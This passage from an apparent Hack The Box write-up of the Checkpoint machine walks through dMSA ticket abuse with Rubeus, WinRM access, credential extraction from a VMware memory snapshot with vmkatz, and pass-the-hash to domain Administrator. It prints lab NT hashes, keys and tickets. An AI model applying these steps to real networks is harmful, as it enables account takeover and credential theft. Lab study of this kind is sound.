LOUCss56sz+0SC51vlSmRwnFmn71lyC7GgWGo/mh71BYI1U4QUT9gKdauozuMA48q6MxW/exrqzZeyUWocY7mqiVU2kHfu8jz3frRP/c5z3KZDjOeBrHae4TH9Ds3Ds7Yrxm02+0UClwb+x+PeO5m4BL/bktFA1RNYLm/ORy99FWCGhL9PY3CyzXJNFJNmeSALm4dqTn6FyKy6jNKoqXukxgwUXJ9UxJRqEf+Ocpv5q0MlP/z06PW1xhvJQv6Rc7h4I2tDHFBYBu+J4Aff/6WOiwb0FDRrkBx1uI9kRelmdHU5dBOT0+I2JjLOy7pulO7uuPNgq8EwbA1/cch++kemuj19Isn6sSbaJCY4O8mZ80+A1JLvD3eFEOSTLmtaRmjepDhrxp+GSRXo3UFo8CKHLprc7fW9a8hZVY6qgVNDqmvrDkQWd2w8zdbgzvE0CZg7+oDJsB7nQnYO8c7UgVMHmNc64m+CIujhjRcumGhsAXvgjpD21poDl6OqPBxE3NuxQeuViZ3hx3pPBmCApc6zNJ8QJUnU/VbnJfoWnceCi0ccLpxPxk4l+Gg+k3MwNThy5pTtxtGSqo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgfczQpHRSvegUOrnW9p9eBCFA1v/95iOh3InfayHhm1+hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAxOTAwNDc1NVqmERgPMjAyNjEwMTkxMDQ3NTVapxEYDzIwMjYxMDI2MDA0NzU1WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for 'svc_backup$' from 'ryan.brooks'
[+] Sequence number is: 770107470
[*] Using domain controller: DC01.checkpoint.htb (fe80::4eb8:b889:bfed:901e%5)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/CHECKPOINT.HTB
  ServiceRealm             :  CHECKPOINT.HTB
  UserName                 :  svc_backup$ (NT_PRINCIPAL)
  UserRealm                :  checkpoint.htb
  StartTime                :  10/18/2026 8:39:16 PM
  EndTime                  :  10/18/2026 8:54:16 PM
  RenewTill                :  10/25/2026 5:47:55 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  xtR4wDLEVFRdRHkfZxXBcoFRoL8pkHoOsLRp2z3xftc=
  Current Keys for svc_backup$: (aes256_cts_hmac_sha1) 817CEAC7DAC6B9F5B2EAA9ADD3C198F78122FEC4CFEB6789B0013966F51E6E4E
```

I’ll download the ticket and convert it:

```
oxdf@hacky$ base64 -d svc_deploy.kirbi.b64 > svc_deploy.kirbi
oxdf@hacky$ ticketConverter.py svc_deploy.kirbi svc_deploy.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Because `svc_backup$` is linked as the successor to svc_deploy, the KDC stamps the dMSA’s ticket with svc_deploy’s SID and group memberships (including REMOTE MANAGEMENT USERS) in its PAC. So even though the ticket’s principal is `svc_backup$`, it carries svc_deploy’s access, which is enough to authenticate over WinRM. The shell comes in as `svc_backup$`, but with svc_deploy’s group rights:

```rust
oxdf@hacky$ KRB5CCNAME=svc_deploy.ccache evil-winrm-py -i DC01.checkpoint.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.checkpoint.htb:5985' as 'svc_backup$@checkpoint.htb'
evil-winrm-py PS C:\Users\svc_backup$\Documents>
```

## Shell as Administrator

### Enumeration

Either on the host or from my VM, the new interesting access is the `VMBackups` share. `netexec` can reach it:

```sql
oxdf@hacky$ netexec smb DC01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
SMB         10.129.109.154  445    DC01             [*] Enumerated shares
SMB         10.129.109.154  445    DC01             Share           Permissions            Remark
SMB         10.129.109.154  445    DC01             -----           -----------            ------
SMB         10.129.109.154  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.109.154  445    DC01             C$                                     Default share
SMB         10.129.109.154  445    DC01             DevDrop                                VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.109.154  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.109.154  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.109.154  445    DC01             SYSVOL          READ                   Logon server share 
SMB         10.129.109.154  445    DC01             VMBackups       READ 
```

And from this shell:

```
evil-winrm-py PS C:\Shares\VMBackups> ls

    Directory: C:\Shares\VMBackups

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----          5/9/2026   9:54 AM                NightlyBackup_2024-11-01  
```

There’s one more directory before some files:

```
evil-winrm-py PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> ls

    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
-a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
-a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
-a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
-a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
-a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
-a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
-a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf 
```

This is a VMware virtual machine. The `.vmdk` files are the virtual disks, the `.vmem` file is the raw RAM of the guest at the time of a snapshot, and the `.vmsn` file holds the snapshot’s state. A memory snapshot from a running Windows system will include LSASS, which means credentials.

### vmkatz

`vmkatz` ([GitHub](https://github.com/nikaiw/VMkatz)) is a tool made just for this. It describes itself as:

> You are three weeks into a red team engagement. You land on a NAS attached to the virtualization cluster — hundreds of gigabytes of `.vmdk`, `.vmsn`, `.sav` sitting right there. But your link does 200 KB/s. Exfiltrating a single 100 GB disk would take **six days**.
> 
> VMkatz exists because you shouldn’t have to exfiltrate what you can read in place. It extracts Windows credentials directly from VM files — memory snapshots, virtual disks, Veeam backups: NTLM hashes, Kerberos tickets, DPAPI master keys, LSA secrets, NTDS.dit, BitLocker keys, browser secrets.
> 
> Single static binary, ~3 MB. Drop it on the ESXi host, the Proxmox node, or the NAS. Point it at a VM folder and walk away with credentials, not disk images.

I’ll download the latest release and upload it to Checkpoint:

```
evil-winrm-py PS C:\programdata> upload vmkatz.exe vmkatz.exe
Uploading ~/hackthebox/checkpoint/vmkatz.exe: 2.56MB [00:02, 1.03MB/s]                                               
[+] File uploaded successfully as: C:\programdata\vmkatz.exe
```

There are a bunch of ways to run this. The first example in the README is to pass a VMware snapshot (`.vmsn`) file:

```yaml
evil-winrm-py PS C:\shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> \programdata\vmkatz.exe "Windows Server 2019-Snapshot1.vmsn"

[+] SAM Hashes:
  RID: 500   Administrator         NT:f29e9c014295b9b32139b09a2790be3b
  RID: 501   Guest                 NT:00000000000000000000000000000000  (DISABLED, NO PASSWORD)
  RID: 503   DefaultAccount        NT:00000000000000000000000000000000  (DISABLED, NO PASSWORD)
  RID: 504   WDAGUtilityAccount    NT:28f8d934dee90b2ec824351cb0844479  (DISABLED)

[+] LSA Secrets:
  DPAPI_SYSTEM
    user_key:    914b2bd39adf134401ec6eceb08f8ec131d2ecbd
    machine_key: 77d90ebac2487f870a26e4776c72b4509b06dd1b
  NL$KM
    key: 0e421c8e384f72e38169dd54e29255fa6c319978314c9e6a7fb9f92606ac7bffeb8a9509446e3a5262b1c2f766b0c353673029e7a3f3776a886970a69ab46f40
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)

[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [Kerberos]
    DES_CBC_CRC: 3a997d283fc46da0
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [Kerberos]
    RC4_HMAC_EXP: 3a997d283fc46da0bd689ee00614a24d
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

[*] vmkatz v1.5.1
[!] image is 2.0 GB but only 1.5 GB RAM is available — scanned pages are released as they're consumed to bound memory; on a constrained host prefer copying the image off-host to scan
[*] System discovery: 15.157542s
[*] Process enumeration: 44.0621ms
[*] Recovering registry hives via CM hive-map...
[+] Bootkey: 75247bc64fa0086d2c98744d4bcd53f5
[*] Credential extraction: 374.757ms
[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It warns that the snapshot is bigger than the available RAM on Checkpoint, but still extracts the Administrator NTLM hash.

### WinRM

That hash is for the local Administrator on a standalone Server 2019 VM (in the WORKGROUP domain), not for the domain. Still, it’s worth checking for password reuse, and it works to get a shell as the domain Administrator:

```rust
oxdf@hacky$ evil-winrm-py -i DC01.checkpoint.htb -u administrator -H f29e9c014295b9b32139b09a2790be3b
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.checkpoint.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

The root flag is on the Desktop of max.palmer:

```
evil-winrm-py PS C:\Users\max.palmer\Desktop> cat root.txt
890bf926************************
```
